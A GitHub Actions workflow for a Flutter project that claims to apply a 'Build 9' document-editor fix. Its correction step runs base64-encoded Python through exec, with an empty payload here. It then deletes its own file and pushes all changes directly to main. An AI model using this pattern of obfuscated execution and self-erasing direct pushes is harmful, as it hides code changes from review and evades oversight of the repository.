name: Apply Build 9 commercial document correction

on:
  workflow_dispatch:
  push:
    branches: [main]
    paths:
      - '.github/workflows/apply-build9-commercial-document-fix.yml'

permissions:
  contents: write
  actions: write

jobs:
  correct-source:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - uses: subosito/flutter-action@v2
        with:
          flutter-version: '3.44.5'
          channel: stable
          cache: true
      - name: Apply correction
        run: python3 -c "import base64;exec(base64.b64decode(''))"
      - name: Resolve locked dependencies
        run: flutter pub get --enforce-lockfile
      - name: Format source
        run: dart format .
      - name: Run regression test
        run: flutter test test/commercial_document_editor_test.dart --reporter expanded
      - name: Commit corrected Build 9 source
        shell: bash
        run: |
          rm -f .github/workflows/apply-build9-commercial-document-fix.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "Fix commercial document product selection and release Build 9"
          git push origin HEAD:main
      - name: Dispatch Windows Build 9 validation
        env:
          GH_TOKEN: ${{ github.token }}
        run: gh workflow run windows-build.yml --ref main
